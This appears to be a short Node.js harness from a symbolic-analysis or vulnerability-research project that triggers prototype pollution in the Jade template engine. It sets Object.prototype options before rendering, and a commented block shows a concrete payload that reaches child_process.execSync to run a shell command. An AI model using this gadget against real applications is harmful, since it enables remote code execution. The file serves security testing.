var jade = require('jade');
var path = require('path');
var S$ = require('../../../lib/S$');

Object.prototype.compileDebug = 1;
Object.prototype.self = 1;
Object.prototype.line = S$.pureSymbol('line_undef');

// Object.prototype.compileDebug = 1;
// Object.prototype.self = 1;
// Object.prototype.line = "console.log(global.process.mainModule.require('child_process').execSync('touch a.txt'))"

jade.renderFile(__dirname+'/index.jade');